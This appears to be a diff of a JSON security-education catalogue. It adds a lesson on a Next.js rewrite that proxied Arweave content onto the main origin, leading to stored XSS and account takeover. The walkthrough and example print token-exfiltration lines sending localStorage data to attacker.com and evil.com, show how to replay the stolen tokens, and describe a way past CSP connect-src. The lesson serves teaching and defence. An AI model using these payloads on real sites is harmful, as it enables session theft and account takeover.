@@ -182,27 +182,27 @@
     "published_at": "2026-11-21T18:12:52.000Z",
     "added_at": "2026-11-22T10:00:57.605Z",
     "categories": [
-      "cache-smuggling",
-      "auth-bypass",
-      "access-control"
+      "xss",
+      "access-control",
+      "auth-bypass"
     ],
     "severity": "critical",
     "difficulty": "intermediate",
-    "summary_en": "A vulnerability in a Next.js CDN proxy configuration allowed for a one-click account takeover, likely through cache-related exploitation.",
+    "summary_en": "A Next.js rewrite rule proxied a permissionless storage network (Arweave) onto the main domain, allowing attackers to host malicious HTML that stole authentication tokens from localStorage. This resulted in a one-click account takeover that bypassed Content Security Policy (CSP) protections.",
     "summary_ar": null,
     "lesson": {
-      "cause": null,
-      "walkthrough": null,
-      "example": null,
-      "takeaway": null,
-      "fix": null,
+      "cause": "The root cause was an architectural flaw in the Next.js `rewrites()` configuration, which acted as a reverse proxy for Arweave. A reverse proxy (a server that sits in front of another and forwards requests) was configured to fetch content from Arweave and serve it under the application's own origin (the domain name and protocol). Because Arweave is permissionless (anyone can upload files), an attacker could host a malicious HTML file there. When the application served this file on its own domain, the browser treated the attacker's script as 'trusted' code, granting it full access to the user's localStorage data.",
+      "walkthrough": "RECON\n1. The researcher analyzed the open-source configuration file `next.config.ts` to find how the server routes traffic.\n2. They identified a `rewrites()` function that mapped internal paths to external URLs:\n`{ source: '/cdn/arweave/:path*', destination: 'https://arweave.net/:path*' }` \nWhy: This creates a reverse proxy (a middleman server) that makes external content appear as if it belongs to the target domain.\n\nDISCOVERY\n3. The researcher noted that Arweave is a permissionless storage network (a system where anyone can save files permanently).\n4. They tested the standard proxy path but found it redirected to a safe, isolated subdomain.\n5. They discovered the `/raw/` endpoint on Arweave, which serves files directly without redirection:\n`target.com/cdn/arweave/raw/{transaction_id}`\nWhy: The `/raw/` endpoint (a specific web address for data) bypasses security redirects, allowing HTML to render directly on the target's domain.\n\nEXPLOITATION\n6. The researcher checked the Content Security Policy (CSP) (a security layer that tells the browser which scripts are safe to run).\n7. The CSP allowed `script-src 'self' 'unsafe-inline'`, meaning scripts from the same domain or written directly in HTML would run.\n8. They confirmed the application stored sensitive session tokens in `localStorage` (a web storage area that JavaScript can read, unlike secure cookies).\n9. The researcher uploaded a malicious HTML file to Arweave containing a script to steal these tokens.\n\nPAYLOAD BREAKDOWN\n10. The payload used `localStorage.getItem('auth:token')` to grab the user's login key.\n11. To send the data to their own server, they used `window.location` (a command that changes the browser's current URL):\n`window.location = 'https://attacker.com/?d=' + btoa(JSON.stringify(tokens));` \nWhy: `btoa` (a function that turns data into a text string) encodes the tokens into the URL. This bypasses `connect-src` (a CSP rule that blocks background data transfers) because browsers must always allow the user to navigate to a new page.\n\nIMPACT\n12. The researcher clicked the link, and the script automatically sent their tokens to the attacker's server.\n13. They used the stolen tokens to impersonate the user by injecting them back into a fresh browser's `localStorage`:\n`localStorage.setItem('auth:token', stolen_jwt);` \nWhy: This tricks the website into thinking the attacker is the logged-in victim, granting full access to private data and account settings.",
+      "example": "Imagine a site `social.example` that allows you to view files from a public cloud via `social.example/view/:file_id`. The server is configured to fetch `https://public-cloud.com/:file_id` and show it to you. An attacker uploads a file named `steal.html` to the cloud. This file contains: `<script>location.href='https://evil.com/log?data='+localStorage.getItem('session');</script>`. The attacker sends a link to a victim: `https://social.example/view/steal.html`. When the victim clicks, their browser thinks `social.example` is running the script. The script reads the 'session' key from the browser's memory and sends it to `evil.com`. The attacker now has the victim's login key.",
+      "takeaway": "Always audit configuration files like `next.config.js` or `nginx.conf` for proxy rules. If your application proxies a service where users can upload content (like IPFS, Arweave, or S3), you are effectively allowing those users to run JavaScript on your domain. To prevent this, never store sensitive tokens in `localStorage`; use `HttpOnly` cookies (a setting that prevents JavaScript from seeing the cookie). Also, remember that CSP `connect-src` does not stop data theft via `window.location` redirects.",
+      "fix": "The most effective fix is to remove the proxy rewrite rule for untrusted storage networks. If you must proxy content, serve it from a completely different domain (e.g., `user-content.com`) so that it does not share an origin with your main site. Alternatively, use the `Content-Security-Policy: sandbox` header or render the content inside an `<iframe>` with the `sandbox` attribute to prevent scripts from accessing the parent page's data. \n\nExample of a safer rewrite (removing the proxy):\n`// In next.config.js, remove the vulnerable line:` \n`// { source: '/cdn/arweave/:path*', destination: 'https://arweave.net/:path*' }`",
       "cause_ar": null,
       "walkthrough_ar": null,
       "example_ar": null,
       "takeaway_ar": null,
       "fix_ar": null
     },
-    "excerpt": null,
+    "excerpt": "A Next.js rewrite rule proxied decentralized storage content through the target’s origin. Since the storage network is permissionless — anyone can upload HTML — an attacker could serve arbitrary JavaScript on the application’s domain, bypassing CSP, stealing auth tokens from localStorage, and achieving full account takeover. CVSS 9.3 Critical. ## Recon — Reading the Source I pulled the open-source repo and started reading next.config.ts. Most bug hunters skip config files — they’re chasing API endpoints and input fields. But config files are where architectural decisions live, and architectura",
     "ai_generated": true,
     "engagement": null,
     "score": 60
